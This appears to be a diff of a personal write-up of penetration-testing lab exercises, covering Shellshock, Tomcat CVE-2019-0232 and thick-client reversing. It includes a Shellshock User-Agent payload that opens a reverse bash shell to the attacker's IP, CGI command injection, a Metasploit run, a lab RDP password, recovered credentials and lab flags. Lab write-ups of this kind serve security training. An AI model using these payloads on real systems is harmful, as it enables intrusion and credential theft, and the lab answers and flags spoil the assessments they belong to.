@@ -19554,22 +19554,13 @@ Results: 8.2.2</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-40-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1"></a>http://10.129.205.30:8080/cgi/welcome.bat?&amp;c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 </span></code></pre></div></td></tr></table></div>
 <p>Results: feldspar\omen</p>
-<h2 id="thick-client-applications">Thick Client Applications</h2>
-<h2 id="miscellaneous-applications">Miscellaneous Applications</h2>
-<h2 id="skills-assessments">Skills Assessments</h2>
-<h3 id="attacking-common-applications-skills-assessment-i">Attacking Common Applications - Skills Assessment I</h3>
-<p>During a penetration test against the company Inlanefreight, you have performed extensive enumeration and found the network to be quite locked down and well-hardened. You come across one host of particular interest that may be your ticket to an initial foothold. Enumerate the target host for potentially vulnerable applications, obtain a foothold, and submit the contents of the flag.txt file to complete this portion of the skills assessment.</p>
-<p><strong>What vulnerable application is running?</strong></p>
-<p>We enumerate the services and ports:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-41-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1"></a>nmap 10.129.201.89 -Pn -sC -sV -p- --open
+<p><strong>Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-41-1">1</a></span>
+<span class="normal"><a href="#__codelineno-41-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1"></a>ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.27/cgi-bin/FUZZ.cgi
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2"></a>gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
 </span></code></pre></div></td></tr></table></div>
-<p>We see apache tomcat. After accessing the web we can see that is running under version 9.0.0.M1</p>
-<p>Results: Tomcat </p>
-<p><strong>What port is this application running on?</strong></p>
-<p>Results: 8080</p>
-<p><strong>What version of the application is in use?</strong></p>
-<p>9.0.0.M1</p>
-<p><strong>Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop.</strong></p>
+<p>Output:  /access.cgi </p>
+<p>Now we can do via curl o via Burpsuite:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-42-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-42-2"> 2</a></span>
 <span class="normal"><a href="#__codelineno-42-3"> 3</a></span>
@@ -19579,72 +19570,166 @@ Results: 8.2.2</p>
 <span class="normal"><a href="#__codelineno-42-7"> 7</a></span>
 <span class="normal"><a href="#__codelineno-42-8"> 8</a></span>
 <span class="normal"><a href="#__codelineno-42-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-42-10">10</a></span>
-<span class="normal"><a href="#__codelineno-42-11">11</a></span>
-<span class="normal"><a href="#__codelineno-42-12">12</a></span>
-<span class="normal"><a href="#__codelineno-42-13">13</a></span>
-<span class="normal"><a href="#__codelineno-42-14">14</a></span>
-<span class="normal"><a href="#__codelineno-42-15">15</a></span>
-<span class="normal"><a href="#__codelineno-42-16">16</a></span>
-<span class="normal"><a href="#__codelineno-42-17">17</a></span>
-<span class="normal"><a href="#__codelineno-42-18">18</a></span>
-<span class="normal"><a href="#__codelineno-42-19">19</a></span>
-<span class="normal"><a href="#__codelineno-42-20">20</a></span>
-<span class="normal"><a href="#__codelineno-42-21">21</a></span>
-<span class="normal"><a href="#__codelineno-42-22">22</a></span>
-<span class="normal"><a href="#__codelineno-42-23">23</a></span>
-<span class="normal"><a href="#__codelineno-42-24">24</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1"></a>ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat
-</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2"></a>
-</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3"></a>        /&#39;___\  /&#39;___\           /&#39;___\       
-</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4"></a>       /\ \__/ /\ \__/  __  __  /\ \__/       
-</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5"></a>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6"></a>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7"></a>         \ \_\   \ \_\  \ \____/  \ \_\       
-</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8"></a>          \/_/    \/_/   \/___/    \/_/       
-</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9"></a>
-</span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10"></a>       v2.1.0-dev
-</span><span id="__span-42-11"><a id="__codelineno-42-11" name="__codelineno-42-11"></a>________________________________________________
-</span><span id="__span-42-12"><a id="__codelineno-42-12" name="__codelineno-42-12"></a>
-</span><span id="__span-42-13"><a id="__codelineno-42-13" name="__codelineno-42-13"></a> :: Method           : GET
-</span><span id="__span-42-14"><a id="__codelineno-42-14" name="__codelineno-42-14"></a> :: URL              : http://10.129.201.89:8080/cgi/FUZZ.bat
-</span><span id="__span-42-15"><a id="__codelineno-42-15" name="__codelineno-42-15"></a> :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
-</span><span id="__span-42-16"><a id="__codelineno-42-16" name="__codelineno-42-16"></a> :: Follow redirects : false
-</span><span id="__span-42-17"><a id="__codelineno-42-17" name="__codelineno-42-17"></a> :: Calibration      : false
-</span><span id="__span-42-18"><a id="__codelineno-42-18" name="__codelineno-42-18"></a> :: Timeout          : 10
-</span><span id="__span-42-19"><a id="__codelineno-42-19" name="__codelineno-42-19"></a> :: Threads          : 40
-</span><span id="__span-42-20"><a id="__codelineno-42-20" name="__codelineno-42-20"></a> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
-</span><span id="__span-42-21"><a id="__codelineno-42-21" name="__codelineno-42-21"></a>________________________________________________
-</span><span id="__span-42-22"><a id="__codelineno-42-22" name="__codelineno-42-22"></a>
-</span><span id="__span-42-23"><a id="__codelineno-42-23" name="__codelineno-42-23"></a>cmd                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
-</span><span id="__span-42-24"><a id="__codelineno-42-24" name="__codelineno-42-24"></a>:: Progress: [4614/4614] :: Job [1/1] :: 328 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
+<span class="normal"><a href="#__codelineno-42-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1"></a>GET /cgi-bin/access.cgi HTTP/1.1
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2"></a>Host: 10.129.205.27
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3"></a>User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.15.78/1234 0&gt;&amp;1
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7"></a>Connection: keep-alive
+</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8"></a>Upgrade-Insecure-Requests: 1
+</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9"></a>If-Modified-Since: Mon, 12 Oct 2020 09:32:54 GMT
+</span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10"></a>If-None-Match: &quot;2aa6-5b175fba24dbe-gzip&quot;
 </span></code></pre></div></td></tr></table></div>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-43-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1"></a>http://10.129.201.89:8080/cgi/cmd.bat?&amp;dir+C:\Users\Administrator\Desktop
+<p>In the reverse shell</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-43-1">1</a></span>
+<span class="normal"><a href="#__codelineno-43-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1"></a>ls -la
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2"></a>cat flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Results: Sh3ll_Sh0cK_123</p>
+<h2 id="thick-client-applications">Thick Client Applications</h2>
+<p><strong>Perform an analysis of C:\Apps\Restart-OracleService.exe and identify the credentials hidden within its source code. Submit the answer using the format username:password.</strong></p>
+<p>We connect to the machine via RDP:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-44-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1"></a>xfreerdp /v:10.129.117.65 /u:cybervaca /p:&#39;&amp;aue%C)}6g-d{w&#39; /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p>We open the tool <code>ProcMon64</code> from <a href="https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon">SysInternals</a> located at c:\Tools\ProcessMonitor\Procmon64.exe. We set the filter "Process name" contains Restart-OracleService</p>
+<p><img alt="" src="../img/thick_00.png" /></p>
+<p>and Start the capture.</p>
+<p>We start the C:\Apps\Restart-OracleService.exe program</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-45-1">1</a></span>
+<span class="normal"><a href="#__codelineno-45-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1"></a>cd C:\Apps\
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2"></a>.\Restart-OracleService.exe 
+</span></code></pre></div></td></tr></table></div>
+<p>We can see in the process monitor that the temp folder is being written with some content. 
+<img alt="" src="../img/thick_01.png" /></p>
+<p>We browse to the Temp folder C:\Users\cybervaca\AppData\Local\Temp and retrieve the .bat file</p>
+<p><img alt="" src="../img/thick_02.png" /></p>
+<p>When opening witht the Notepad, we observe some lines removing some scripts and the executable. We can remove the del lines and execute again the program:</p>
+<p><img alt="" src="../img/thick_03.png" /></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-46-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1"></a>.\Restart-OracleService.exe 
+</span></code></pre></div></td></tr></table></div>
+<p>Now, if we browse to c:\ProgramData we will see the new files monta.ps1, oracle.txt:</p>
+<p><img alt="" src="../img/thick_04.png" /></p>
+<p>We can read the script:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-47-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1"></a><span class="nb">cat </span><span class="n">C</span><span class="p">:\</span><span class="n">programdata</span><span class="p">\</span><span class="n">monta</span><span class="p">.</span><span class="n">ps1</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-48-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1"></a><span class="nv">$salida</span> <span class="p">=</span> <span class="nv">$null</span><span class="p">;</span> <span class="nv">$fichero</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Content</span> <span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">oracle</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span> <span class="p">;</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$linea</span> <span class="k">in</span> <span class="nv">$fichero</span><span class="p">)</span> <span class="p">{</span><span class="nv">$salida</span> <span class="p">+=</span> <span class="nv">$linea</span> <span class="p">};</span> <span class="nv">$salida</span> <span class="p">=</span> <span class="nv">$salida</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">&quot;c:\programdata\restart-service.exe&quot;</span><span class="p">,</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$salida</span><span class="p">))</span>
+</span></code></pre></div></td></tr></table></div>
+<p>This script simply reads the contents of the <code>oracle.txt</code> file and decodes it to the <code>restart-service.exe</code> executable. Running this script gives us a final executable that we can further analyze.</p>
+<p><img alt="" src="../img/thick_05.png" /></p>
+<p>Now, we will start procmon64, and modify the filter to catch those process name that contains restart-service string. And we launch the restart-service.</p>
+<p>We will  start <code>x64dbg</code>, navigate to <code>Options</code> -&gt; <code>Preferences</code>, and uncheck everything except <code>Exit Breakpoint</code>: By unchecking the other options, the debugging will start directly from the application's exit point, and we will avoid going through any <code>dll</code> files that are loaded before the app starts.</p>
+<p>Then, we can select <code>file</code> -&gt; <code>open</code> and select the <code>restart-service.exe</code> to import it and start the debugging. Once imported, we right click inside the <code>CPU</code> view and <code>Follow in Memory Map</code>.</p>
+<p><img alt="" src="../img/thick_06.png" /></p>
+<p>We will double click on the first line:</p>
+<p><img alt="" src="../img/thick_07.png" /></p>
+<p>If we double-click on it, we will see the magic bytes <code>MZ</code> in the <code>ASCII</code> column that indicates that the file is a <a href="https://en.wikipedia.org/wiki/DOS_MZ_executable">DOS MZ executable</a>. Memory-mapped files allow applications to access large files without having to read or write the entire file into memory at once. Instead, the file is mapped to a region of memory that the application can read and write as if it were a regular buffer in memory. This could be a place to potentially look for hardcoded credentials.</p>
+<p><img alt="" src="../img/thick_08.png" /></p>
+<p>Let's return to the Memory Map pane, then export the newly discovered mapped item from memory to a dump file by right-clicking on the address and selecting <code>Dump Memory to File</code>.</p>
+<p><img alt="" src="../img/thick_09.png" /></p>
+<p>We run Strings and notice that it  contains a binary:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-49-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1"></a>.\strings.exe C:\Users\cybervaca\Desktop\restart-service_0000000000A50000.bin
+</span></code></pre></div></td></tr></table></div>
+<p><img alt="" src="../img/thick_10.png" /></p>
+<p>If we open it with dnspy, we will be able to see some creds:</p>
+<p><img alt="" src="../img/thick_11.png" /></p>
+<p>Results: svc_oracle:#oracle_s3rV1c3!2010</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-50-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1"></a>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-51-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1"></a>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-52-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1"></a>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="miscellaneous-applications">Miscellaneous Applications</h2>
+<h2 id="skills-assessments">Skills Assessments</h2>
+<h3 id="attacking-common-applications-skills-assessment-i">Attacking Common Applications - Skills Assessment I</h3>
+<p>During a penetration test against the company Inlanefreight, you have performed extensive enumeration and found the network to be quite locked down and well-hardened. You come across one host of particular interest that may be your ticket to an initial foothold. Enumerate the target host for potentially vulnerable applications, obtain a foothold, and submit the contents of the flag.txt file to complete this portion of the skills assessment.</p>
+<p><strong>What vulnerable application is running?</strong></p>
+<p>We enumerate the services and ports:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-53-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1"></a>nmap 10.129.201.89 -Pn -sC -sV -p- --open
+</span></code></pre></div></td></tr></table></div>
+<p>We see apache tomcat. After accessing the web we can see that is running under version 9.0.0.M1</p>
+<p>Results: Tomcat </p>
+<p><strong>What port is this application running on?</strong></p>
+<p>Results: 8080</p>
+<p><strong>What version of the application is in use?</strong></p>
+<p>9.0.0.M1</p>
+<p><strong>Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop.</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-54-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-54-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-54-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-54-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-54-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-54-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-54-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-54-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-54-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-54-10">10</a></span>
+<span class="normal"><a href="#__codelineno-54-11">11</a></span>
+<span class="normal"><a href="#__codelineno-54-12">12</a></span>
+<span class="normal"><a href="#__codelineno-54-13">13</a></span>
+<span class="normal"><a href="#__codelineno-54-14">14</a></span>
+<span class="normal"><a href="#__codelineno-54-15">15</a></span>
+<span class="normal"><a href="#__codelineno-54-16">16</a></span>
+<span class="normal"><a href="#__codelineno-54-17">17</a></span>
+<span class="normal"><a href="#__codelineno-54-18">18</a></span>
+<span class="normal"><a href="#__codelineno-54-19">19</a></span>
+<span class="normal"><a href="#__codelineno-54-20">20</a></span>
+<span class="normal"><a href="#__codelineno-54-21">21</a></span>
+<span class="normal"><a href="#__codelineno-54-22">22</a></span>
+<span class="normal"><a href="#__codelineno-54-23">23</a></span>
+<span class="normal"><a href="#__codelineno-54-24">24</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1"></a>ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2"></a>
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3"></a>        /&#39;___\  /&#39;___\           /&#39;___\       
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4"></a>       /\ \__/ /\ \__/  __  __  /\ \__/       
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5"></a>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6"></a>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7"></a>         \ \_\   \ \_\  \ \____/  \ \_\       
+</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8"></a>          \/_/    \/_/   \/___/    \/_/       
+</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9"></a>
+</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10"></a>       v2.1.0-dev
+</span><span id="__span-54-11"><a id="__codelineno-54-11" name="__codelineno-54-11"></a>________________________________________________
+</span><span id="__span-54-12"><a id="__codelineno-54-12" name="__codelineno-54-12"></a>
+</span><span id="__span-54-13"><a id="__codelineno-54-13" name="__codelineno-54-13"></a> :: Method           : GET
+</span><span id="__span-54-14"><a id="__codelineno-54-14" name="__codelineno-54-14"></a> :: URL              : http://10.129.201.89:8080/cgi/FUZZ.bat
+</span><span id="__span-54-15"><a id="__codelineno-54-15" name="__codelineno-54-15"></a> :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+</span><span id="__span-54-16"><a id="__codelineno-54-16" name="__codelineno-54-16"></a> :: Follow redirects : false
+</span><span id="__span-54-17"><a id="__codelineno-54-17" name="__codelineno-54-17"></a> :: Calibration      : false
+</span><span id="__span-54-18"><a id="__codelineno-54-18" name="__codelineno-54-18"></a> :: Timeout          : 10
+</span><span id="__span-54-19"><a id="__codelineno-54-19" name="__codelineno-54-19"></a> :: Threads          : 40
+</span><span id="__span-54-20"><a id="__codelineno-54-20" name="__codelineno-54-20"></a> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span><span id="__span-54-21"><a id="__codelineno-54-21" name="__codelineno-54-21"></a>________________________________________________
+</span><span id="__span-54-22"><a id="__codelineno-54-22" name="__codelineno-54-22"></a>
+</span><span id="__span-54-23"><a id="__codelineno-54-23" name="__codelineno-54-23"></a>cmd                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
+</span><span id="__span-54-24"><a id="__codelineno-54-24" name="__codelineno-54-24"></a>:: Progress: [4614/4614] :: Job [1/1] :: 328 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-55-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1"></a>http://10.129.201.89:8080/cgi/cmd.bat?&amp;dir+C:\Users\Administrator\Desktop
 </span></code></pre></div></td></tr></table></div>
 <p>I used metasploit:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-44-1">1</a></span>
-<span class="normal"><a href="#__codelineno-44-2">2</a></span>
-<span class="normal"><a href="#__codelineno-44-3">3</a></span>
-<span class="normal"><a href="#__codelineno-44-4">4</a></span>
-<span class="normal"><a href="#__codelineno-44-5">5</a></span>
-<span class="normal"><a href="#__codelineno-44-6">6</a></span>
-<span class="normal"><a href="#__codelineno-44-7">7</a></span>
-<span class="normal"><a href="#__codelineno-44-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1"></a>msfconsole -q
-</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2"></a>search CVE-2019-0232
-</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3"></a>use 0
-</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4"></a>set RHOSTS 10.129.73.151
-</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5"></a>set LHOST 10.10.14.147
-</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6"></a>set ForceExploit true
-</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7"></a>set targeturi /cgi/cmd.bat
-</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8"></a>run
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-56-1">1</a></span>
+<span class="normal"><a href="#__codelineno-56-2">2</a></span>
+<span class="normal"><a href="#__codelineno-56-3">3</a></span>
+<span class="normal"><a href="#__codelineno-56-4">4</a></span>
+<span class="normal"><a href="#__codelineno-56-5">5</a></span>
+<span class="normal"><a href="#__codelineno-56-6">6</a></span>
+<span class="normal"><a href="#__codelineno-56-7">7</a></span>
+<span class="normal"><a href="#__codelineno-56-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1"></a>msfconsole -q
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2"></a>search CVE-2019-0232
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3"></a>use 0
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4"></a>set RHOSTS 10.129.73.151
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5"></a>set LHOST 10.10.14.147
+</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6"></a>set ForceExploit true
+</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7"></a>set targeturi /cgi/cmd.bat
+</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8"></a>run
 </span></code></pre></div></td></tr></table></div>
 <p>In the meterpreter session now you can type the flag:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-45-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1"></a>type c:\Users\Administrator\Desktop\flag.txt
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-57-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1"></a>type c:\Users\Administrator\Desktop\flag.txt
 </span></code></pre></div></td></tr></table></div>
 <p>Results: f55763d31a8f63ec935abd07aee5d3d0</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-02-07T22:46:37+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-02-07</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-02-09T20:01:37+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-02-09</span></small></br>
 
 
     <small>Created: February 2, 2025 19:49:43</small>
